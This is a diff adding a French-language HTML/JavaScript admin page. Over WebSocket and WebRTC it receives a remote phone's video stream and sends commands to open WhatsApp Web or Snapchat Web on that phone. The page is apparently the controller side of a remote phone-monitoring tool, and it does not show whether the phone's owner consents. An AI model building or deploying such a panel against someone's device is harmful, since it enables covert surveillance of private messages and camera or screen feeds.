@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Admin - Interface contrôle</title>
+</head>
+<body>
+  <h2>Interface Admin - Contrôle Téléphone</h2>
+  <video id="remoteVideo" autoplay playsinline style="width: 300px; border:1px solid #000;"></video>
+  <br/><br/>
+
+  <button onclick="sendCommand('open_whatsapp')">Ouvrir WhatsApp Web</button>
+  <button onclick="sendCommand('open_snapchat')">Ouvrir Snapchat Web</button>
+  <button onclick="sendCommand('ping')">Ping Client</button>
+
+  <p id="status">Status: Non connecté</p>
+
+<script>
+const ws = new WebSocket('ws://TON_SERVEUR:8080');
+let pc;
+const remoteVideo = document.getElementById('remoteVideo');
+
+ws.onopen = () => {
+  ws.send(JSON.stringify({ type: 'role', role: 'admin' }));
+  updateStatus("Connecté au serveur");
+  startPeerConnection();
+};
+
+ws.onmessage = async (event) => {
+  const data = JSON.parse(event.data);
+
+  if(data.type === 'webrtc') {
+    if(data.description) {
+      const desc = new RTCSessionDescription(data.description);
+      await pc.setRemoteDescription(desc);
+      if(desc.type === 'offer') {
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+        ws.send(JSON.stringify({ type: 'webrtc', description: pc.localDescription }));
+      }
+    } else if(data.candidate) {
+      try {
+        await pc.addIceCandidate(data.candidate);
+      } catch(e) {
+        console.error("Erreur addIceCandidate:", e);
+      }
+    }
+  } else if(data.type === 'status') {
+    updateStatus("Client: " + data.message);
+  }
+};
+
+function updateStatus(msg) {
+  document.getElementById('status').innerText = "Status: " + msg;
+}
+
+function startPeerConnection() {
+  pc = new RTCPeerConnection();
+
+  pc.onicecandidate = event => {
+    if(event.candidate) {
+      ws.send(JSON.stringify({ type: 'webrtc', candidate: event.candidate }));
+    }
+  };
+
+  pc.ontrack = event => {
+    remoteVideo.srcObject = event.streams[0];
+  };
+}
+
+function sendCommand(cmd) {
+  ws.send(JSON.stringify({ type: 'command', command: cmd }));
+}
+</script>
+</body>
+</html>
